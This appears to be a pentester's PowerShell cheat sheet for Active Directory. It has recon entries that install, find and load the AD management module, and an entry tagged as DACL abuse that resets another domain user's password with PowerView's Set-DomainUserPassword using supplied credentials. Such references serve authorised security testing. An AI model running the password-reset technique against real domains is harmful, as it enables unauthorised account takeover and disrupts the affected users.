# powershell

% ad, windows, powershell

## powershel - AD - Downoad the AD Module DLL
#plateform/windows #target/remote  #cat/RECON 

```
Get-WindowsCapability -Name RSAT*ActiveDirectory* -Online | Add-WindowsCapability -Online
```

## powershel - AD - Find the AD Module DLL
#plateform/windows #target/remote  #cat/RECON 

```
gci -Path 'C:\Windows' -Recurse -Filter 'Microsoft.ActiveDirectory.Management.dll' -EA SilentlyContinue | ? {$_.FullName -like '*GAC_64*' -or $_.FullName -like '*amd64*'} | select -Expand FullName
```


## powershel - AD - load AD Module
#plateform/windows #target/remote  #cat/RECON 

```
Import-Module .\Microsoft.ActiveDirectory.Management.dll
```

## powershel - AD - Check commands
#plateform/windows #target/remote  #cat/RECON 

```
Get-Command -Module Microsoft.ActiveDirectory.Management
```


## change user password
#plateform/windows #target/remote  #cat/ATTACK/DACL-ABUSE 
```
$SecPassword = ConvertTo-SecureString '<password>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<domain_netbios>\<user>', $SecPassword)
$UserPassword = ConvertTo-SecureString '<new_password>' -AsPlainText -Force
Set-DomainUserPassword -Identity <target_user> -AccountPassword $UserPassword -Credential $Cred
```

